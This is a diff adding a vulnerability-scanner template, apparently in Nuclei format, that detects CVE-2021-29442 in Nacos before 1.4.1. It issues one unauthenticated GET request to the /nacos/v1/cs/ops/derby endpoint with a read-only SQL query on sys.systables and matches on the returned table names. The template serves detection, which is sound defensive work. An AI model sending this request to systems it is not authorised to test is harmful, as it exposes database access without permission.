@@ -1,0 +1,32 @@
+id: scopesentry-nacos-derby-unauth
+
+info:
+  name: Nacos Derby Endpoint Unauthenticated SQL Query
+  author: scopesentry
+  severity: high
+  description: |
+    Nacos < 1.4.1 的 /nacos/v1/cs/ops/derby 未挂 @Secured，未认证即可执行 SQL（仅嵌入式 Derby 存储）。
+    判据：查询 sys.systables 返回含 tablename 与 SYSTABLES 的 JSON 结果集；返回鉴权错误或空集不算。
+    只做只读元数据查询，不改不删。
+  tags: nacos,unauth,database,cve-2021-29442
+  metadata:
+    verified: false
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)"tablename"'
+      - type: word
+        part: body
+        words:
+          - 'SYSTABLES'
+      - type: status
+        status:
+          - 200
